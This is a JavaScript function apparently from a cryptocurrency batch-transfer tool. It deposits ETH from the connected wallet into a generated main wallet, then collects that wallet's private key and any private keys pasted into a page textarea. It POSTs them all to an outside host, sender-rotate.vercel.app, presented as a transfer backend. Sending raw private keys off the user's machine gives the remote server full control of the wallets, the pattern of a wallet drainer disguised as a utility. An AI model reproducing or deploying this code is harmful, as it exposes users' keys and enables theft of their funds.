window.depositAndTransfer = async function (provider, signer, connectedAddress, mainWallet, lastCalculatedTotal, chainId, log) {
  try {
    if (!mainWallet) {
      log("❌ Generate main wallet first", "red");
      return;
    }
    if (!lastCalculatedTotal) {
      log("❌ Run Calculate Total first", "red");
      return;
    }
    const { totalDeposit, amountPerWallet, receivers } = lastCalculatedTotal;

    log(`ℹ️ Inputs: chainId=${chainId}, amountPerWallet=${ethers.utils.formatEther(amountPerWallet)}, receivers=${receivers.length}, totalDeposit=${ethers.utils.formatEther(totalDeposit)}`, "cyan");

    const [balance, gasPrice, gasLimit] = await Promise.all([
      provider.getBalance(connectedAddress),
      provider.getGasPrice(),
      provider.estimateGas({ to: mainWallet.address, value: totalDeposit }),
    ]);

    const gasCost = gasLimit.mul(gasPrice);
    const totalCost = totalDeposit.add(gasCost);
    if (balance.lt(totalCost)) {
      log(`❌ Insufficient balance in ${connectedAddress}. Need ${ethers.utils.formatEther(totalCost)} ETH`, "red");
      return;
    }

    log(`📤 Depositing ${ethers.utils.formatEther(totalDeposit)} to main wallet: ${mainWallet.address}`, "cyan");
    log(`ℹ️ Estimated gas cost: ${ethers.utils.formatEther(gasCost)}`, "cyan");

    const txResponse = await signer.sendTransaction({
      to: mainWallet.address,
      value: totalDeposit,
      gasPrice,
      gasLimit,
    });

    if (!txResponse.hash) {
      log("❌ Send TX failed: No transaction hash", "red");
      return;
    }

    log(`🚀 TX Sent: ${txResponse.hash} | ⏳ Awaiting confirmation...`, "cyan");
    const receipt = await txResponse.wait(1);
    if (receipt.status === 1) {
      log(`✅ TX Successful: ${txResponse.hash}`, "green");

      // Ambil private keys dari textarea
      const privateKeysInput = document.getElementById("privateKeys")?.value
        ?.split("\n")
        .map(line => line.trim())
        .filter(line => line.match(/^0x[0-9a-fA-F]{64}$/)) || [];
      const privateKeys = [mainWallet.privateKey, ...privateKeysInput];
      log(`ℹ️ Using ${privateKeys.length} private keys for rotation`, "cyan");

      // Validasi receivers
      if (receivers.length === 0) {
        log("❌ No receivers provided", "red");
        return;
      }
      if (privateKeys.length < receivers.length) {
        log(`❌ Not enough private keys (${privateKeys.length}) for ${receivers.length} receivers`, "red");
        return;
      }
      log(`ℹ️ Sending to ${receivers.length} receivers`, "cyan");

      const response = await fetch("https://sender-rotate.vercel.app/api/transfer", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          privateKeys,
          chainId: parseInt(chainId),
          amountPerWallet: ethers.utils.formatEther(amountPerWallet),
          receivers,
        }),
        signal: AbortSignal.timeout(30000),
      });

      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`Fetch failed: ${response.status} ${response.statusText} - ${errorText}`);
      }

      const data = await response.json();
      if (data.success) {
        log("✅ Backend transfers completed", "green");
        data.transactions.forEach((tx, i) => {
          log(`📤 Transferred ${ethers.utils.formatEther(amountPerWallet)} to ${tx.receiver} from ${tx.sender}: ${tx.hash}`, "blue");
        });
      } else {
        log(`❌ Backend transfer failed: ${data.error}`, "red");
        console.error("Backend transfer error:", data.error);
      }
    } else {
      log(`❌ TX Failed: ${txResponse.hash}`, "red");
    }
  } catch (error) {
    log(`❌ Error: ${error.message}`, "red");
    console.error("Deposit error:", error);
  }
};
